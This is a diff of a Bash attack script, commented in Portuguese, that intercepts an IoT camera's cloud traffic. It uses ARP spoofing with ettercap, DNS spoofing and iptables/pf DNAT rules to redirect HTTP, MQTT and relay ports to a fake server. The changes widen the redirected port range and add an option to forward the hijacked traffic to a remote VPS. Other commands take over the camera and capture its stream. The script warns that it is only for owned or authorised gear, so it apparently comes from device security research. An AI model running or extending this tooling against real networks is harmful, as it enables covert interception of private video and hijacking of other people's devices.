@@ -21,7 +21,7 @@
 #   ./mitm_dns.sh watch [nome]            # tail -F ao vivo
 #   sudo ./mitm_dns.sh dnat on|off        # fallback: desvia IPs fixos do cloud pro fake
 #                                         #   (Linux: iptables DNAT | macOS: pf rdr, EXPERIMENTAL)
-#   sudo ./mitm_dns.sh relay              # relay-only: desvia so 29940/29942 (MQTT/HTTP no cloud real)
+#   sudo ./mitm_dns.sh relay              # relay-only: desvia so 29939-29942 (MQTT/HTTP no cloud real)
 #   sudo ./mitm_dns.sh takeover [cmd...]  # espera camera no MQTT, manda comandos, prova stream
 #   ./mitm_dns.sh cheat                   # passos manuais (camera + PC)
 #   sudo ./mitm_dns.sh bundle             # junta logs+configs num arquivo so
@@ -55,8 +55,9 @@ RESP_WAIT="${RESP_WAIT:-20}"                     # s coletando a resposta da cam
 STREAM_SECS="${STREAM_SECS:-15}"                 # s de captura do /live
 P2P_WAIT="${P2P_WAIT:-30}"                       # s esperando o registro P2P (relay)
 RELAY_PORT="${RELAY_PORT:-29940}"                # porta do "relay" que a camera usa p/ registrar
+DNAT_TARGET="${DNAT_TARGET:-}"                    # destino do DNAT (vazio = fake local no MY_IP; setar = IP da VPS)
 FAKE_SRV_RELAY_HOST="${FAKE_SRV_RELAY_HOST:-107.149.143.96}"  # IP publico do relay real (dnat desvia pro fake)
-DNAT_MODE="${DNAT_MODE:-all}"                     # 'all' (80/1883/29940/29942) ou 'relay' (so 29940/29942)
+DNAT_MODE="${DNAT_MODE:-all}"                     # 'all' (80/1883/29939-29942) ou 'relay' (so 29939-29942)
 
 # Portas do cloud desviadas pelo fallback 'dnat on' (por porta, nao por IP).
 # A camera tem um pool de IPs hardcoded — redirecionar por porta cobre todos.
@@ -308,23 +309,31 @@ etter_dns_path() {
 
 # --------------------------------------------------------------- DNAT fallback
 # Redireciona por PORTA (nao por IP) pra cobrir o pool de IPs hardcoded da camera.
-# Portas do cloud: HTTP 80, MQTT 1883, relay 29940/29942 (TCP e UDP).
+# Portas do cloud: HTTP 80, MQTT 1883, relay 29939-29942 (TCP e UDP).
 dnat_rules_on() {
   if (( IS_MAC )); then
     if [[ "$DNAT_MODE" == "relay" ]]; then
       cat > "$PF_ANCHOR" <<EOF
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
 EOF
     else
       cat > "$PF_ANCHOR" <<EOF
 rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 80 -> $MY_IP port 80
 rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 1883 -> $MY_IP port 1883
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
 rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
 EOF
     fi
@@ -340,13 +349,14 @@ rdr-anchor "mitm_dns"
       pfctl -e >/dev/null 2>&1 && touch "$RUN_DIR/pf_we_enabled"
     fi
   else
-    local specs=("tcp 29939 $RELAY_PORT" "tcp 29940 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29939 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29942 $RELAY_PORT")
+    local dnat_host="${DNAT_TARGET:-$MY_IP}"
+    local specs=("tcp 29939 $RELAY_PORT" "tcp 29940 $RELAY_PORT" "tcp 29941 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29939 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29941 $RELAY_PORT" "udp 29942 $RELAY_PORT")
     [[ "$DNAT_MODE" == "relay" ]] || specs=("tcp 80 80" "tcp 1883 1883" "${specs[@]}")
     local spec proto dport toport
     for spec in "${specs[@]}"; do
       read -r proto dport toport <<< "$spec"
-      iptables -t nat -C PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$MY_IP:$toport" 2>/dev/null \
-        || iptables -t nat -A PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$MY_IP:$toport"
+      iptables -t nat -C PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$dnat_host:$toport" 2>/dev/null \
+        || iptables -t nat -A PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$dnat_host:$toport"
     done
     echo "$CAM_IP" > "$RUN_DIR/dnat_cam_ip"
   fi
@@ -364,12 +374,13 @@ dnat_rules_off() {
     # so desliga o pf se fomos NOS que ligamos
     [[ -f "$RUN_DIR/pf_we_enabled" ]] && { pfctl -d >/dev/null 2>&1; rm -f "$RUN_DIR/pf_we_enabled"; }
   else
-    local cam spec proto dport toport
+    local cam dnat_host spec proto dport toport
     cam="${CAM_IP}"
     [[ -f "$RUN_DIR/dnat_cam_ip" ]] && cam=$(cat "$RUN_DIR/dnat_cam_ip")
-    for spec in "tcp 80 80" "tcp 1883 1883" "tcp 29940 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29942 $RELAY_PORT"; do
+    dnat_host="${DNAT_TARGET:-$MY_IP}"
+    for spec in "tcp 80 80" "tcp 1883 1883" "tcp 29939 $RELAY_PORT" "tcp 29940 $RELAY_PORT" "tcp 29941 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29939 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29941 $RELAY_PORT" "udp 29942 $RELAY_PORT"; do
       read -r proto dport toport <<< "$spec"
-      iptables -t nat -D PREROUTING -p "$proto" -s "$cam" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$MY_IP:$toport" 2>/dev/null || true
+      iptables -t nat -D PREROUTING -p "$proto" -s "$cam" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$dnat_host:$toport" 2>/dev/null || true
     done
     rm -f "$RUN_DIR/dnat_cam_ip"
   fi
@@ -545,7 +556,7 @@ cmd_dnat() {
     on)
       (( IS_MAC )) && warn "no macOS o fallback usa pf rdr (EXPERIMENTAL) — regras em $PF_ANCHOR, anchor no $PF_CONF"
       dnat_rules_on
-      ok "DNAT ativo (por porta): 80/1883/29940/29942 -> $MY_IP (cobre o pool de IPs hardcoded)"
+      ok "DNAT ativo (por porta): 80/1883/29939-29942 -> ${DNAT_TARGET:-$MY_IP} (cobre o pool de IPs hardcoded)"
       say "    (o ARP spoof ja faz o trafego da camera passar por aqui)"
       say "    power cycle na camera pra ela refazer as conexoes."
       ;;
@@ -558,7 +569,7 @@ cmd_dnat() {
 }
 
 # --------------------------------------------------------------- relay-only
-# ARP spoof + DNAT so do relay (29940/29942). MQTT/HTTP da camera continuam no
+# ARP spoof + DNAT so do relay (29939-29942). MQTT/HTTP da camera continuam no
 # cloud real, entao o app real dispara o viewer e a camera cai no fake relay.
 cmd_relay() {
   check_deps
@@ -585,7 +596,7 @@ cmd_relay() {
   echo "   gateway  : $GW_IP"
   echo "   atacante : $MY_IP  ($IFACE)"
   echo "   fake relay : :$RELAY_PORT"
-  echo "   DNAT     : so 29940/29942 -> $MY_IP:$RELAY_PORT"
+  echo "   DNAT     : so 29939-29942 -> ${DNAT_TARGET:-$MY_IP}:$RELAY_PORT"
   echo "   MQTT/HTTP da camera continuam no cloud REAL"
   echo "=================================================================="
   echo " So prosseguir se ESTE equipamento e ESTA rede sao teus / autorizados."
@@ -608,7 +619,7 @@ cmd_relay() {
   sleep 4
   alive ettercap || { say; tail -n 15 "$(log_of ettercap)" | sed 's/^/    /'; die "ettercap morreu no arranque — '$0 logs ettercap'"; }
   dnat_rules_on
-  ok "DNAT relay-only ativo (29940/29942 -> $MY_IP:$RELAY_PORT)"
+  ok "DNAT relay-only ativo (29939-29942 -> ${DNAT_TARGET:-$MY_IP}:$RELAY_PORT)"
 
   say "[3/3] captura -> $PCAP (so host $CAM_IP)"
   start_bg pcap "exec '$TCPDUMP' -i '$IFACE' -n -U host '$CAM_IP' -w '$PCAP'"
@@ -638,7 +649,7 @@ cmd_status() {
   done
   say "DNAT (por porta, cobre pool de IPs):"
   if [[ -n "$MY_IP" ]] && dnat_active; then
-    say "  ATIVO  (80/1883/29940/29942 -> $MY_IP)"
+    say "  ATIVO  (80/1883/29939-29942 -> ${DNAT_TARGET:-$MY_IP})"
   else
     say "  inativo"
   fi
